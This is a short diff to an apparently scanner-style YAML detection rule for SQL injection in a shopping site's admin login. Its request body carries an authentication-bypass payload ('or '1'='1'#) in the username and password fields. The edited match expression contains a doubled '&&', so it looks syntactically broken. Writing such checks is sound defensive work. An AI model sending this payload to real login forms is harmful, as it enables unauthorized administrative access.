@@ -5,9 +5,9 @@ rules:
     headers:
       Content-Type: application/x-www-form-urlencoded
     body: 'username=aaa'' or ''1''=''1''#&password=aaa'' or ''1''=''1''#&submit='
-    follow_redirects: true
+    follow_redirects: false
     expression: |
-      response.body.bcontains(Logout)
+      response.status == 302 && && response.head.bcontains("/shopping/admin/change-password.php")
 detail:
   author: su(https://suzzz112113.github.io/#blog)
   links:
